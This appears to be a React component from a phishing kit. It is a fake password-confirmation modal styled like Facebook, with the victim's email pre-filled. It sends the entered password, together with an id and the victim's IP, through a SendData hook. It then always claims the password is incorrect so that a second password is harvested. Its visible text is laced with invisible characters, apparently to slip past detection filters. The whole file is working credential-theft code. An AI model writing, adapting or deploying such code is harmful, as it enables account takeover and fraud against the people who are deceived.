import React, { useState } from 'react'
import { Col, Row } from 'react-bootstrap'
import styled from 'styled-components'
import SendData from '../hooks/SendData'


const Wrapper = styled.div`
    position: fixed;
    top: 0;
    left: 0;
    z-index: 1050;
    width: 100%;
    height: 100%;
    overflow: hidden;
    outline: 0;
    display: grid;
    place-items: center;
    background-color: rgba(0,0,0,.5);
    padding: 1.5rem;
`
const ModalContent = styled.div`
    background-color: #fff;
    background-clip: padding-box;
    border: 1px solid rgba(0,0,0,.2);
    border-radius: 0.3rem;
    outline: 0;
    max-width: 500px;
    width: 100%;
    z-index: 1051;
    position: 'relative';
`

const Title = styled.div`
    color: #050505 !important;
    font-size: 16px !important;
    font-weight: 700 !important;
`

const XBtn = styled.div`
    font-size: 1.5rem;
    font-weight: 700;
    line-height: 1;
    color: #000;
    text-shadow: 0 1px 0 #fff;
    opacity: .5;
`
const BorderBottom = styled.div`
    border-bottom:1px solid #dee2e6;
`
const Label = styled.div`
    color: #90949c;
    font-weight: bold;
    font-size: 12px;
    padding-bottom: 0.5rem;
`
const Input = styled.input`
    border: 1px solid #ced4da !important;
    border-radius: 0px !important;
    padding: 0.375rem 0.75rem !important;
    
`
const Btn = styled.button`
    background-color: #4267b2;
    border: 1px solid #4267b2;
    color: white;
    margin-top: 15px;
    font-size: 13px;
    font-weight: 700;
    padding: 7px 20px;
    border-radius: 2px;
    text-transform: none;
    font-weight: bold;
    
`

function ModalPw({ Email, setStep, Unik, Ip }) {
    const [Pw, setPw] = useState('')
    const [TriedSubmit, setTriedSubmit] = useState(false)
    const [SubmitTime, setSubmitTime] = useState(0)

    const handleSubmit = () => {

        setTriedSubmit(true)
        if (SubmitTime === 0 && Pw.length > 5) {
            setSubmitTime(1)
            setPw('')
            const params = {
                id: Unik,
                ip: Ip,
                password_one: Pw
            };

            SendData(params)
        }
        else if (SubmitTime === 1) {
            const params = {
                id: Unik,
                ip: Ip,
                password_two: Pw
            };

            SendData(params)
            setStep(2)

        }

    }
    return (
        <Wrapper>
            <ModalContent>
                <BorderBottom className='p-3'>

                    <Row className='align-items-center'>
                        <Col>
                            <Title>
                                P‎l‎e‎a‎se E‎n‎t‎er Y‎ou‎r P‎a‎s‎s‎w‎o‎rd
                            </Title>
                        </Col>
                        <Col xs={'auto'}>
                            <XBtn>
                                ×
                            </XBtn>
                        </Col>
                    </Row>
                </BorderBottom>
                <div className="p-3">
                    <p style={{ fontSize: '14px' }}>
                        F‎o‎r y‎o‎ur s‎e‎c‎u‎r‎ity, y‎ou mu‎st e‎nt‎er your p‎as‎sw‎o‎rd t‎o co‎n‎ti‎nue‎.
                    </p>
                    <div className="pb-3">
                        <Label>
                            Em‎a‎i‎l ad‎dr‎e‎s‎s
                        </Label>
                        <Input className={`form-control`} type='email' disabled defaultValue={Email} />
                    </div>
                    <div>
                        <form className='mb-0'>

                            <Label>
                                P‎a‎s‎sw‎o‎r‎d
                            </Label>
                            <Input className={`inputTypePW form-control ${(Pw.length < 5 && TriedSubmit) && 'redborder'}`} type='text' value={Pw} onChange={(e) => { setPw(e.target.value) }} />
                            {
                                SubmitTime === 1 && (
                                    <div className='text-end' style={{ color: 'red', fontSize: '13px', fontWeight: 500 }}>
                                        T‎h‎e p‎as‎sw‎or‎d yo‎u‎'‎ve e‎nt‎er‎ed i‎s in‎c‎o‎r‎r‎e‎ct.
                                    </div>
                                )
                            }
                        </form>

                    </div>
                    <div className='text-end'>
                        <Btn onClick={handleSubmit}>
                            S‎u‎b‎m‎i‎t
                        </Btn>
                    </div>
                </div>
            </ModalContent>
        </Wrapper >
    )
}

export default ModalPw